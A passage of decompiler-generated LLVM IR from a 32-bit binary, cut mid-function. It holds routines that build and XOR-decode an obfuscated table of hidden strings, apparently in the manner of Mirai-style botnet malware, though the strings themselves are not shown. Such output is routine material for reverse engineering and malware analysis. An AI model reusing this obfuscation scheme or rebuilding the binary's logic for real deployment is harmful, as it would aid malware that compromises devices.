  %v2_8048203 = inttoptr i32 %v1_8048203 to i8*
  store i8 0, i8* %v2_8048203, align 1
  %v2_8048207.pre = load i32, i32* %stack_var_-8, align 4
  %v0_8048209.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8048207

dec_label_pc_8048207:                             ; preds = %dec_label_pc_80481a5, %dec_label_pc_8048203
  %v0_8048209 = phi i32 [ %v4_8048192, %dec_label_pc_80481a5 ], [ %v0_8048209.pre, %dec_label_pc_8048203 ]
  %v2_8048207 = phi i32 [ %v0_804818b, %dec_label_pc_80481a5 ], [ %v2_8048207.pre, %dec_label_pc_8048203 ]
  store i32 %v2_8048207, i32* @ebx, align 4
  ret i32 %v0_8048209

; uselistorder directives
  uselistorder i32 %v3_80481fc, { 0, 2, 3, 1 }
  uselistorder i32 %v0_80481f2.pre, { 0, 2, 1 }
  uselistorder i32 %v1_80481ef, { 2, 1, 0 }
  uselistorder i32 %v0_80481d4.pre, { 0, 2, 1 }
  uselistorder i32 %v0_80481d0.pre, { 0, 2, 1 }
  uselistorder i32 %v0_80481fc, { 4, 0, 1, 3, 2, 5 }
  uselistorder i32 %v4_8048192, { 3, 1, 2, 0 }
  uselistorder i32* %esi.global-to-local, { 3, 1, 2, 0 }
  uselistorder i32* %ebx.global-to-local, { 0, 1, 3, 2, 4, 5, 6, 7 }
  uselistorder label %dec_label_pc_8048207, { 1, 0 }
  uselistorder label %dec_label_pc_8048203, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_80481dc, { 1, 0 }
  uselistorder label %dec_label_pc_80481af, { 1, 0 }
  uselistorder label %dec_label_pc_8048198, { 1, 0 }
}

define i32 @function_804820a(i8 %arg1) local_unnamed_addr {
dec_label_pc_804820a:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804820b = load i32, i32* @ebx, align 4
  store i32 %v0_804820b, i32* %stack_var_-8, align 4
  %v0_804820c = load i32, i32* @global_var_804f67c.5, align 4
  store i32 %v0_804820c, i32* %ebx.global-to-local, align 4
  %v4_8048212 = zext i8 %arg1 to i32
  %v5_8048212 = load i32, i32* @ecx, align 4
  %v6_8048212 = and i32 %v5_8048212, -256
  %v7_8048212 = or i32 %v6_8048212, %v4_8048212
  store i32 %v7_8048212, i32* @ecx, align 4
  %v1_80482805 = icmp eq i32 %v0_804820c, 0
  %v1_80482827 = icmp eq i1 %v1_80482805, false
  br i1 %v1_80482827, label %dec_label_pc_8048218, label %dec_label_pc_8048284

dec_label_pc_8048218:                             ; preds = %dec_label_pc_804820a, %dec_label_pc_804827d
  %v0_804827d = phi i32 [ %v3_804827d, %dec_label_pc_804827d ], [ %v0_804820c, %dec_label_pc_804820a ]
  %v1_8048218 = inttoptr i32 %v0_804827d to i32*
  %v2_8048218 = load i32, i32* %v1_8048218, align 4
  store i32 %v2_8048218, i32* %edx.global-to-local, align 4
  %tmp23 = icmp slt i32 %v2_8048218, 1
  br i1 %tmp23, label %dec_label_pc_804827d, label %dec_label_pc_804821e

dec_label_pc_804821e:                             ; preds = %dec_label_pc_8048218
  store i32 %v4_8048212, i32* @eax, align 4
  %v12_8048221 = icmp eq i32 %v4_8048212, %v2_8048218
  %v1_8048223 = icmp eq i1 %v12_8048221, false
  br i1 %v1_8048223, label %dec_label_pc_804827d, label %dec_label_pc_8048225

dec_label_pc_8048225:                             ; preds = %dec_label_pc_804821e
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_8048227 = add i32 %v0_804827d, 10
  %v2_8048227 = inttoptr i32 %v1_8048227 to i8*
  %v3_8048227 = load i8, i8* %v2_8048227, align 1
  %v4_8048227 = icmp eq i8 %v3_8048227, 0
  br i1 %v4_8048227, label %dec_label_pc_8048250.preheader, label %dec_label_pc_8048288

dec_label_pc_8048250.preheader:                   ; preds = %dec_label_pc_8048225
  %v1_804825035 = add i32 %v0_804827d, 8
  %v2_804825036 = inttoptr i32 %v1_804825035 to i16*
  %v3_804825037 = load i16, i16* %v2_804825036, align 2
  %v12_804825439 = icmp eq i16 %v3_804825037, 0
  br i1 %v12_804825439, label %dec_label_pc_8048258, label %dec_label_pc_804822f

dec_label_pc_804822f:                             ; preds = %dec_label_pc_8048250.preheader, %dec_label_pc_804822f
  %v1_804823142 = phi i32 [ %v0_8048250.pre, %dec_label_pc_804822f ], [ %v0_804827d, %dec_label_pc_8048250.preheader ]
  %v0_804822f41 = phi i32 [ %v0_8048254.pre, %dec_label_pc_804822f ], [ 0, %dec_label_pc_8048250.preheader ]
  %v2_8048231 = add i32 %v1_804823142, 4
  %v3_8048231 = inttoptr i32 %v2_8048231 to i32*
  %v4_8048231 = load i32, i32* %v3_8048231, align 4
  %v5_8048231 = add i32 %v4_8048231, %v0_804822f41
  %v1_8048234 = inttoptr i32 %v5_8048231 to i8*
  %v2_8048234 = load i8, i8* %v1_8048234, align 1
  %v3_8048234 = xor i8 %v2_8048234, -19
  store i8 %v3_8048234, i8* %v1_8048234, align 1
  %v0_8048237 = load i32, i32* %edx.global-to-local, align 4
  %v1_8048239 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8048239 = add i32 %v1_8048239, 4
  %v3_8048239 = inttoptr i32 %v2_8048239 to i32*
  %v4_8048239 = load i32, i32* %v3_8048239, align 4
  %v5_8048239 = add i32 %v4_8048239, %v0_8048237
  %v1_804823c = inttoptr i32 %v5_8048239 to i8*
  %v2_804823c = load i8, i8* %v1_804823c, align 1
  %v3_804823c = xor i8 %v2_804823c, -22
  store i8 %v3_804823c, i8* %v1_804823c, align 1
  %v0_804823f = load i32, i32* %edx.global-to-local, align 4
  %v1_8048241 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8048241 = add i32 %v1_8048241, 4
  %v3_8048241 = inttoptr i32 %v2_8048241 to i32*
  %v4_8048241 = load i32, i32* %v3_8048241, align 4
  %v5_8048241 = add i32 %v4_8048241, %v0_804823f
  %v1_8048244 = inttoptr i32 %v5_8048241 to i8*
  %v2_8048244 = load i8, i8* %v1_8048244, align 1
  %v3_8048244 = xor i8 %v2_8048244, -34
  store i8 %v3_8048244, i8* %v1_8048244, align 1
  %v0_8048247 = load i32, i32* %edx.global-to-local, align 4
  %v1_8048249 = add i32 %v0_8048247, 1
  store i32 %v1_8048249, i32* %edx.global-to-local, align 4
  %v1_804824a = load i32, i32* %ebx.global-to-local, align 4
  %v2_804824a = add i32 %v1_804824a, 4
  %v3_804824a = inttoptr i32 %v2_804824a to i32*
  %v4_804824a = load i32, i32* %v3_804824a, align 4
  %v5_804824a = add i32 %v4_804824a, %v0_8048247
  %v1_804824d = inttoptr i32 %v5_804824a to i8*
  %v2_804824d = load i8, i8* %v1_804824d, align 1
  %v3_804824d = xor i8 %v2_804824d, -34
  store i8 %v3_804824d, i8* %v1_804824d, align 1
  %v0_8048250.pre = load i32, i32* %ebx.global-to-local, align 4
  %v0_8048254.pre = load i32, i32* %edx.global-to-local, align 4
  %v1_8048250 = add i32 %v0_8048250.pre, 8
  %v2_8048250 = inttoptr i32 %v1_8048250 to i16*
  %v3_8048250 = load i16, i16* %v2_8048250, align 2
  %v4_8048250 = zext i16 %v3_8048250 to i32
  %v5_8048256 = icmp slt i32 %v0_8048254.pre, %v4_8048250
  br i1 %v5_8048256, label %dec_label_pc_804822f, label %dec_label_pc_8048258

dec_label_pc_8048258:                             ; preds = %dec_label_pc_804822f, %dec_label_pc_8048250.preheader
  %v5_804826146 = phi i32 [ 0, %dec_label_pc_8048250.preheader ], [ %v0_8048254.pre, %dec_label_pc_804822f ]
  %v1_8048231.lcssa = phi i32 [ %v0_804827d, %dec_label_pc_8048250.preheader ], [ %v0_8048250.pre, %dec_label_pc_804822f ]
  store i32 0, i32* %esi.global-to-local, align 4
  %v1_804827226 = add i32 %v1_8048231.lcssa, 8
  %v2_804827227 = inttoptr i32 %v1_804827226 to i16*
  %v3_804827228 = load i16, i16* %v2_804827227, align 2
  %v4_804827229 = zext i16 %v3_804827228 to i32
  %v1_804827630 = add nsw i32 %v4_804827229, -1
  store i32 %v1_804827630, i32* @eax, align 4
  %v5_804827932 = icmp ugt i16 %v3_804827228, 1
  br i1 %v5_804827932, label %dec_label_pc_804825c, label %dec_label_pc_8048284

dec_label_pc_804825c:                             ; preds = %dec_label_pc_8048258, %dec_label_pc_804825c.dec_label_pc_804825c_crit_edge
  %v5_8048261 = phi i32 [ %v5_8048261.pre, %dec_label_pc_804825c.dec_label_pc_804825c_crit_edge ], [ %v5_804826146, %dec_label_pc_8048258 ]
  %v0_804825c34 = phi i32 [ %v1_804826f, %dec_label_pc_804825c.dec_label_pc_804825c_crit_edge ], [ 0, %dec_label_pc_8048258 ]
  %v1_804825e33 = phi i32 [ %v0_8048272.pre, %dec_label_pc_804825c.dec_label_pc_804825c_crit_edge ], [ %v1_8048231.lcssa, %dec_label_pc_8048258 ]
  %v2_804825e = add i32 %v1_804825e33, 4
  %v3_804825e = inttoptr i32 %v2_804825e to i32*
  %v4_804825e = load i32, i32* %v3_804825e, align 4
  %v5_804825e = add i32 %v4_804825e, %v0_804825c34
  %v1_8048261 = add i32 %v5_804825e, 1
  %v2_8048261 = inttoptr i32 %v1_8048261 to i8*
  %v3_8048261 = load i8, i8* %v2_8048261, align 1
  %v4_8048261 = zext i8 %v3_8048261 to i32
  %v6_8048261 = and i32 %v5_8048261, -256
  %v7_8048261 = or i32 %v6_8048261, %v4_8048261
  store i32 %v7_8048261, i32* %edx.global-to-local, align 4
  %v1_8048264 = inttoptr i32 %v5_804825e to i8*
  %v2_8048264 = load i8, i8* %v1_8048264, align 1
  %v3_8048264 = zext i8 %v2_8048264 to i32
  %v4_8048264 = load i32, i32* @ecx, align 4
  %v5_8048264 = and i32 %v4_8048264, -256
  %v6_8048264 = or i32 %v5_8048264, %v3_8048264
  store i32 %v6_8048264, i32* @ecx, align 4
  store i8 %v3_8048261, i8* %v1_8048264, align 1
  %v0_8048268 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8048268 = add i32 %v0_8048268, 4
  %v2_8048268 = inttoptr i32 %v1_8048268 to i32*
  %v3_8048268 = load i32, i32* %v2_8048268, align 4
  %v0_804826b = load i32, i32* @ecx, align 4
  %v1_804826b = trunc i32 %v0_804826b to i8
  %v3_804826b = load i32, i32* %esi.global-to-local, align 4
  %v4_804826b = add i32 %v3_8048268, 1
  %v5_804826b = add i32 %v4_804826b, %v3_804826b
  %v6_804826b = inttoptr i32 %v5_804826b to i8*
  store i8 %v1_804826b, i8* %v6_804826b, align 1
  %v0_804826f = load i32, i32* %esi.global-to-local, align 4
  %v1_804826f = add i32 %v0_804826f, 2
  %v0_8048272.pre = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v1_804826f, i32* %esi.global-to-local, align 4
  %v1_8048272 = add i32 %v0_8048272.pre, 8
  %v2_8048272 = inttoptr i32 %v1_8048272 to i16*
  %v3_8048272 = load i16, i16* %v2_8048272, align 2
  %v4_8048272 = zext i16 %v3_8048272 to i32
  %v1_8048276 = add nsw i32 %v4_8048272, -1
  store i32 %v1_8048276, i32* @eax, align 4
  %v5_8048279 = icmp slt i32 %v1_804826f, %v1_8048276
  br i1 %v5_8048279, label %dec_label_pc_804825c.dec_label_pc_804825c_crit_edge, label %dec_label_pc_8048284

dec_label_pc_804825c.dec_label_pc_804825c_crit_edge: ; preds = %dec_label_pc_804825c
  %v5_8048261.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804825c

dec_label_pc_804827d:                             ; preds = %dec_label_pc_804821e, %dec_label_pc_8048218
  %v1_804827d = add i32 %v0_804827d, 12
  %v2_804827d = inttoptr i32 %v1_804827d to i32*
  %v3_804827d = load i32, i32* %v2_804827d, align 4
  store i32 %v3_804827d, i32* %ebx.global-to-local, align 4
  %v1_8048280 = icmp eq i32 %v3_804827d, 0
  %v1_8048282 = icmp eq i1 %v1_8048280, false
  br i1 %v1_8048282, label %dec_label_pc_8048218, label %dec_label_pc_8048280.dec_label_pc_8048284.loopexit3_crit_edge

dec_label_pc_8048280.dec_label_pc_8048284.loopexit3_crit_edge: ; preds = %dec_label_pc_804827d
  br label %dec_label_pc_8048284

dec_label_pc_8048284:                             ; preds = %dec_label_pc_8048258, %dec_label_pc_804825c, %dec_label_pc_804820a, %dec_label_pc_8048280.dec_label_pc_8048284.loopexit3_crit_edge
  %v0_8048284 = phi i32 [ %v3_804827d, %dec_label_pc_8048280.dec_label_pc_8048284.loopexit3_crit_edge ], [ %v0_804820c, %dec_label_pc_804820a ], [ %v1_8048231.lcssa, %dec_label_pc_8048258 ], [ %v0_8048272.pre, %dec_label_pc_804825c ]
  %v1_8048284 = add i32 %v0_8048284, 10
  %v2_8048284 = inttoptr i32 %v1_8048284 to i8*
  store i8 1, i8* %v2_8048284, align 1
  %v2_8048288.pre = load i32, i32* %stack_var_-8, align 4
  %v0_804828a.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8048288

dec_label_pc_8048288:                             ; preds = %dec_label_pc_8048225, %dec_label_pc_8048284
  %v0_804828a = phi i32 [ %v4_8048212, %dec_label_pc_8048225 ], [ %v0_804828a.pre, %dec_label_pc_8048284 ]
  %v2_8048288 = phi i32 [ %v0_804820b, %dec_label_pc_8048225 ], [ %v2_8048288.pre, %dec_label_pc_8048284 ]
  store i32 %v2_8048288, i32* @ebx, align 4
  ret i32 %v0_804828a

; uselistorder directives
  uselistorder i32 %v3_804827d, { 0, 2, 3, 1 }
  uselistorder i32 %v0_8048272.pre, { 0, 2, 1 }
  uselistorder i32 %v1_804826f, { 2, 1, 0 }
  uselistorder i32 %v0_8048254.pre, { 0, 2, 1 }
  uselistorder i32 %v0_8048250.pre, { 0, 2, 1 }
  uselistorder i32 %v0_804827d, { 4, 0, 1, 3, 2, 5 }
  uselistorder i32 %v4_8048212, { 3, 1, 2, 0 }
  uselistorder i32* %esi.global-to-local, { 3, 1, 2, 0 }
  uselistorder i32* %ebx.global-to-local, { 0, 2, 3, 1, 4, 5, 6, 7 }
  uselistorder label %dec_label_pc_8048288, { 1, 0 }
  uselistorder label %dec_label_pc_8048284, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_804825c, { 1, 0 }
  uselistorder label %dec_label_pc_804822f, { 1, 0 }
  uselistorder label %dec_label_pc_8048218, { 1, 0 }
}

define i32 @function_804828b(i8 %arg1) local_unnamed_addr {
dec_label_pc_804828b:
  %v0_804828b = load i32, i32* @ebx, align 4
  %v0_804828c = load i32, i32* @global_var_804f67c.5, align 4
  %v4_8048292 = zext i8 %arg1 to i32
  %v1_80482a82 = icmp eq i32 %v0_804828c, 0
  %v1_80482aa4 = icmp eq i1 %v1_80482a82, false
  br i1 %v1_80482aa4, label %dec_label_pc_8048298, label %dec_label_pc_80482b1.loopexit

dec_label_pc_8048298:                             ; preds = %dec_label_pc_804828b, %dec_label_pc_80482a5
  %v0_80482a5 = phi i32 [ %v3_80482a5, %dec_label_pc_80482a5 ], [ %v0_804828c, %dec_label_pc_804828b ]
  %v1_8048298 = inttoptr i32 %v0_80482a5 to i32*
  %v2_8048298 = load i32, i32* %v1_8048298, align 4
  %tmp12 = icmp slt i32 %v2_8048298, 1
  br i1 %tmp12, label %dec_label_pc_80482a5, label %dec_label_pc_804829e

dec_label_pc_804829e:                             ; preds = %dec_label_pc_8048298
  store i32 %v4_8048292, i32* @eax, align 4
  %v12_80482a1 = icmp eq i32 %v4_8048292, %v2_8048298
  br i1 %v12_80482a1, label %dec_label_pc_80482ae, label %dec_label_pc_80482a5

dec_label_pc_80482a5:                             ; preds = %dec_label_pc_804829e, %dec_label_pc_8048298
  %v1_80482a5 = add i32 %v0_80482a5, 12
  %v2_80482a5 = inttoptr i32 %v1_80482a5 to i32*
  %v3_80482a5 = load i32, i32* %v2_80482a5, align 4
  %v1_80482a8 = icmp eq i32 %v3_80482a5, 0
  %v1_80482aa = icmp eq i1 %v1_80482a8, false
  br i1 %v1_80482aa, label %dec_label_pc_8048298, label %dec_label_pc_80482a8.dec_label_pc_80482b1.loopexit_crit_edge

dec_label_pc_80482ae:                             ; preds = %dec_label_pc_804829e
  %v1_80482ae = add i32 %v0_80482a5, 4
  %v2_80482ae = inttoptr i32 %v1_80482ae to i32*
  br label %dec_label_pc_80482b1

dec_label_pc_80482a8.dec_label_pc_80482b1.loopexit_crit_edge: ; preds = %dec_label_pc_80482a5
  br label %dec_label_pc_80482b1.loopexit

dec_label_pc_80482b1.loopexit:                    ; preds = %dec_label_pc_80482a8.dec_label_pc_80482b1.loopexit_crit_edge, %dec_label_pc_804828b
  br label %dec_label_pc_80482b1

dec_label_pc_80482b1:                             ; preds = %dec_label_pc_80482b1.loopexit, %dec_label_pc_80482ae
  %v0_80482b2.in = phi i32* [ @eax, %dec_label_pc_80482b1.loopexit ], [ %v2_80482ae, %dec_label_pc_80482ae ]
  %v0_80482b2 = load i32, i32* %v0_80482b2.in, align 4
  store i32 %v0_804828b, i32* @ebx, align 4
  ret i32 %v0_80482b2

; uselistorder directives
  uselistorder i32 %v3_80482a5, { 1, 0 }
  uselistorder label %dec_label_pc_8048298, { 1, 0 }
}

define i32 @function_80482b3() local_unnamed_addr {
dec_label_pc_80482b3:
  %v1_80482b8 = call i32 @function_804b6c8(i32 16)
  %v1_80482bd = add i32 %v1_80482b8, 12
  %v2_80482bd = inttoptr i32 %v1_80482bd to i32*
  store i32 0, i32* %v2_80482bd, align 4
  %v1_80482c4 = inttoptr i32 %v1_80482b8 to i32*
  store i32 0, i32* %v1_80482c4, align 4
  store i32 %v1_80482b8, i32* @global_var_804f680.6, align 128
  store i32 %v1_80482b8, i32* @global_var_804f67c.5, align 4
  ret i32 %v1_80482b8

; uselistorder directives
  uselistorder i32 %v1_80482b8, { 0, 2, 1, 3, 4 }
}

define i32 @function_80482d8(i32 %arg1, i16 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_80482d8:
  %stack_var_-8 = alloca i32, align 4
  %v0_80482d8 = load i32, i32* @esi, align 4
  %v0_80482d9 = load i32, i32* @ebx, align 4
  store i32 %v0_80482d9, i32* %stack_var_-8, align 4
  %v4_80482dd = zext i16 %arg2 to i32
  store i32 %v4_80482dd, i32* @esi, align 4
  %v2_80482e4 = call i32 @function_804b6c8(i32 16)
  %v0_80482e9 = load i32, i32* @esi, align 4
  store i32 %v2_80482e4, i32* @ebx, align 4
  %v2_80482f2 = inttoptr i32 %v2_80482e4 to i32*
  store i32 %arg1, i32* %v2_80482f2, align 4
  %sext = mul i32 %v0_80482e9, 65536
  %v1_80482f4 = sdiv i32 %sext, 65536
  %v2_80482f4 = call i32 @function_804b6c8(i32 %v1_80482f4)
  %v0_80482fc = load i32, i32* @esi, align 4
  %v1_8048302 = load i32, i32* @ebx, align 4
  %v2_8048302 = add i32 %v1_8048302, 4
  %v3_8048302 = inttoptr i32 %v2_8048302 to i32*
  store i32 %v2_80482f4, i32* %v3_8048302, align 4
  %sext1 = mul i32 %v2_80482f4, 65536
  %v1_8048305 = sdiv i32 %sext1, 65536
  %sext2 = mul i32 %v0_80482fc, 65536
  %v4_8048305 = sdiv i32 %sext2, 65536
  %v5_8048305 = call i32 @function_804a6b7(i32 %v1_8048305, i32 %arg3, i32 %v4_8048305)
  %v0_804830a = load i32, i32* @global_var_804f680.6, align 128
  %v0_804830f = load i32, i32* @esi, align 4
  %v1_804830f = trunc i32 %v0_804830f to i16
  %v2_804830f = load i32, i32* @ebx, align 4
  %v3_804830f = add i32 %v2_804830f, 8
  %v4_804830f = inttoptr i32 %v3_804830f to i16*
  store i16 %v1_804830f, i16* %v4_804830f, align 2
  %v0_8048313 = load i32, i32* @ebx, align 4
  %v1_8048313 = add i32 %v0_8048313, 12
  %v2_8048313 = inttoptr i32 %v1_8048313 to i32*
  store i32 0, i32* %v2_8048313, align 4
  %v0_804831a = load i32, i32* @ebx, align 4
  %v1_804831a = add i32 %v0_804831a, 10
  %v2_804831a = inttoptr i32 %v1_804831a to i8*
  store i8 -1, i8* %v2_804831a, align 1
  %v0_804831e = load i32, i32* @ebx, align 4
  %v2_804831e = add i32 %v0_804830a, 12
  %v3_804831e = inttoptr i32 %v2_804831e to i32*
  store i32 %v0_804831e, i32* %v3_804831e, align 4
  %v0_8048321 = load i32, i32* @ebx, align 4
  store i32 %v0_8048321, i32* @global_var_804f680.6, align 128
  %v2_804832a = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804832a, i32* @ebx, align 4
  store i32 %v0_80482d8, i32* @esi, align 4
  ret i32 %v0_804830a
}

define i32 @function_804832d() local_unnamed_addr {
dec_label_pc_804832d:
  %v0_8048330 = call i32 @function_80482b3()
  %v4_804833f = call i32 @function_80482d8(i32 1, i16 21, i32 ptrtoint (i32* @global_var_804d118.7 to i32))
  %v4_8048350 = call i32 @function_80482d8(i32 2, i16 21, i32 ptrtoint (i32* @global_var_804d12e.8 to i32))
  %v4_8048361 = call i32 @function_80482d8(i32 3, i16 7, i32 ptrtoint (i32* @global_var_804d144.9 to i32))
  %v4_8048372 = call i32 @function_80482d8(i32 4, i16 6, i32 ptrtoint (i32* @global_var_804d14c.10 to i32))
  %v4_8048383 = call i32 @function_80482d8(i32 5, i16 5, i32 ptrtoint (i32* @global_var_804d271.11 to i32))
  %v4_8048394 = call i32 @function_80482d8(i32 6, i16 14, i32 ptrtoint (i32* @global_var_804d153.12 to i32))
  %v4_80483a5 = call i32 @function_80482d8(i32 7, i16 4, i32 ptrtoint (i32* @global_var_804d162.13 to i32))
  %v4_80483b6 = call i32 @function_80482d8(i32 8, i16 17, i32 ptrtoint (i32* @global_var_804d167.14 to i32))
  %v4_80483c7 = call i32 @function_80482d8(i32 9, i16 10, i32 ptrtoint (i32* @global_var_804d17b.15 to i32))
  %v4_80483d8 = call i32 @function_80482d8(i32 10, i16 8, i32 ptrtoint (i32* @global_var_804d186.16 to i32))
  %v4_80483e9 = call i32 @function_80482d8(i32 11, i16 13, i32 ptrtoint (i32* @global_var_804d18f.17 to i32))
  %v4_80483fa = call i32 @function_80482d8(i32 12, i16 11, i32 ptrtoint (i32* @global_var_804d19d.18 to i32))
  %v4_804840b = call i32 @function_80482d8(i32 13, i16 15, i32 ptrtoint (i32* @global_var_804d1a9.19 to i32))
  %v4_804841c = call i32 @function_80482d8(i32 14, i16 10, i32 ptrtoint (i32* @global_var_804d1b9.20 to i32))
  %v4_804842d = call i32 @function_80482d8(i32 15, i16 10, i32 ptrtoint (i32* @global_var_804d1c4.21 to i32))
  %v4_804843e = call i32 @function_80482d8(i32 16, i16 23, i32 ptrtoint (i32* @global_var_804d1cf.22 to i32))
  %v4_804844f = call i32 @function_80482d8(i32 17, i16 33, i32 ptrtoint (i32* @global_var_804d1e7.23 to i32))
  %v4_8048460 = call i32 @function_80482d8(i32 18, i16 23, i32 ptrtoint (i32* @global_var_804d209.24 to i32))
  %v4_8048471 = call i32 @function_80482d8(i32 19, i16 8, i32 ptrtoint (i32* @global_var_804d221.25 to i32))
  %v4_8048482 = call i32 @function_80482d8(i32 20, i16 8, i32 ptrtoint (i32* @global_var_804d22a.26 to i32))
  %v4_8048493 = call i32 @function_80482d8(i32 21, i16 23, i32 ptrtoint (i32* @global_var_804d233.27 to i32))
  %v4_80484a4 = call i32 @function_80482d8(i32 22, i16 10, i32 ptrtoint (i32* @global_var_804d24b.28 to i32))
  %v4_80484b5 = call i32 @function_80482d8(i32 25, i16 16, i32 ptrtoint (i32* @global_var_804d256.29 to i32))
  %v4_80484c6 = call i32 @function_80482d8(i32 26, i16 15, i32 ptrtoint (i32* @global_var_804d267.30 to i32))
  %v4_80484d7 = call i32 @function_80482d8(i32 27, i16 16, i32 ptrtoint (i32* @global_var_804d277.31 to i32))
  %v4_80484e8 = call i32 @function_80482d8(i32 28, i16 16, i32 ptrtoint (i32* @global_var_804d288.32 to i32))
  %v4_80484f9 = call i32 @function_80482d8(i32 29, i16 50, i32 ptrtoint ([51 x i8]* @global_var_804d299.33 to i32))
  %v4_804850a = call i32 @function_80482d8(i32 30, i16 52, i32 ptrtoint ([53 x i8]* @global_var_804d2cc.34 to i32))
  ret i32 %v4_804850a
}

define i32 @function_8048513() local_unnamed_addr {
dec_label_pc_8048513:
  %v0_8048518 = load i32, i32* @global_var_804f684.35, align 4
  %v2_804851e = call i32 @function_804af6b(i32 %v0_8048518, i32 9)
  ret i32 %v2_804851e
}

define i32 @function_8048527(i16 %arg1) local_unnamed_addr {
dec_label_pc_8048527:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp54 = call i8 @__decompiler_undefined_function_1()
  %stack_var_-48 = alloca i8, align 1
  %stack_var_-4657 = alloca i32, align 4
  %stack_var_-8753 = alloca i32, align 4
  %stack_var_-8812 = alloca i32, align 4
  %stack_var_-561 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-8796 = alloca i32, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v15_804852d = ptrtoint i32* %stack_var_-8796 to i32
  %v2_804853b = ptrtoint i32* %stack_var_-32 to i32
  %v3_8048542 = call i16 @llvm.bswap.i16(i16 %arg1)
  %v4_8048542 = zext i16 %v3_8048542 to i32
  store i1 false, i1* @df, align 1
  store i32 0, i32* %stack_var_-32, align 4
  %v6_8048547 = add i32 %v2_804853b, 4
  store i32 %v6_8048547, i32* %edi.global-to-local, align 4
  store i32 %v4_8048542, i32* @esi, align 4
  %v2_804854b = inttoptr i32 %v6_8048547 to i32*
  store i32 0, i32* %v2_804854b, align 4
  %v3_804854b = load i32, i32* %edi.global-to-local, align 4
  %v6_804854b = add i32 %v3_804854b, 4
  store i32 %v6_804854b, i32* %edi.global-to-local, align 4
  %v0_804854c = load i32, i32* %eax.global-to-local, align 4
  %v2_804854c = inttoptr i32 %v6_804854b to i32*
  store i32 %v0_804854c, i32* %v2_804854c, align 4
  %v3_804854c = load i32, i32* %edi.global-to-local, align 4
  %v6_804854c = add i32 %v3_804854c, 4
  store i32 %v6_804854c, i32* %edi.global-to-local, align 4
  %v0_804854d = load i32, i32* %eax.global-to-local, align 4
  %v2_804854d = inttoptr i32 %v6_804854c to i32*
  store i32 %v0_804854d, i32* %v2_804854d, align 4
  %v3_804854d = load i32, i32* %edi.global-to-local, align 4
  %v6_804854d = add i32 %v3_804854d, 4
  store i32 %v6_804854d, i32* @edi, align 4
  %v2_804854e = ptrtoint i32* %stack_var_-561 to i32
  store i32 %v2_804854e, i32* %eax.global-to-local, align 4
  store i32 %v2_804854e, i32* %stack_var_-8812, align 4
  %v3_804855e = bitcast i32* %stack_var_-561 to i8*
  %v4_804855e = call i32 @function_804b381(i8* %v3_804855e, i32 0, i32 513)
  %v2_8048563 = ptrtoint i32* %stack_var_-8753 to i32
  store i32 %v2_8048563, i32* %eax.global-to-local, align 4
  store i32 %v2_8048563, i32* %stack_var_-8812, align 4
  %v3_8048572 = bitcast i32* %stack_var_-8753 to i8*
  %v4_8048572 = call i32 @function_804b381(i8* %v3_8048572, i32 0, i32 4096)
  %v2_8048577 = ptrtoint i32* %stack_var_-4657 to i32
  store i32 %v2_8048577, i32* %eax.global-to-local, align 4
  store i32 %v2_8048577, i32* %stack_var_-8812, align 4
  %v3_8048589 = bitcast i32* %stack_var_-4657 to i8*
  %v4_8048589 = call i32 @function_804b381(i8* %v3_8048589, i32 0, i32 4096)
  store i32 %v4_8048589, i32* %eax.global-to-local, align 4
  %v2_8048591 = ptrtoint i8* %stack_var_-48 to i32
  store i32 %v2_8048591, i32* @ebx, align 4
  %v0_804859b = load i32, i32* @esi, align 4
  store i32 %v0_804859b, i32* %stack_var_-8812, align 4
  %v3_804859c = sext i32 %v0_804859b to i64
  %v4_804859c = call i32 @function_804a784(i64 %v3_804859c, i32 16, i32 %v2_8048591)
  store i32 %v4_804859c, i32* %eax.global-to-local, align 4
  store i32 %v2_8048591, i32* %stack_var_-8812, align 4
  %v1_80485a4 = call i32 @function_804a688(i32 %v2_8048591)
  store i32 %v1_80485a4, i32* @eax, align 4
  %v9_80485ac = icmp eq i32 %v1_80485a4, 2
  %v1_80485af = icmp eq i1 %v9_80485ac, false
  br i1 %v1_80485af, label %dec_label_pc_80485e5, label %dec_label_pc_80485b1

dec_label_pc_80485b1:                             ; preds = %dec_label_pc_8048527
  %v3_80485b1 = load i8, i8* %stack_var_-48, align 1
  %v4_80485b1 = sext i8 %v3_80485b1 to i32
  %v8_80485b1 = or i32 %v4_80485b1, %v1_80485a4
  store i8 48, i8* %stack_var_-48, align 1
  %v4_80485cf = zext i8 %tmp54 to i32
  %v6_80485cf = and i32 %v8_80485b1, -256
  %v7_80485cf = or i32 %v6_80485cf, %v4_80485cf
  store i32 %v7_80485cf, i32* @eax, align 4
  br label %dec_label_pc_80485e5

dec_label_pc_80485e5:                             ; preds = %dec_label_pc_8048527, %dec_label_pc_80485b1
  store i32 3, i32* %stack_var_-8812, align 4
  %v2_80485ea = call i32 @function_804818a(i8 3)
  store i32 %v2_80485ea, i32* @eax, align 4
  store i32 5, i32* %stack_var_-8812, align 4
  %v2_80485f6 = call i32 @function_804818a(i8 5)
  store i32 %v2_80485f6, i32* @eax, align 4
  store i32 7, i32* %stack_var_-8812, align 4
  %v2_8048602 = call i32 @function_804818a(i8 7)
  store i32 %v2_8048602, i32* @eax, align 4
  store i32 6, i32* %stack_var_-8812, align 4
  %v2_804860e = call i32 @function_804818a(i8 6)
  store i32 %v2_804860e, i32* @eax, align 4
  store i32 6, i32* %stack_var_-8812, align 4
  %v2_804861a = call i32 @function_804828b(i8 6)
  store i32 %v2_804861a, i32* %eax.global-to-local, align 4
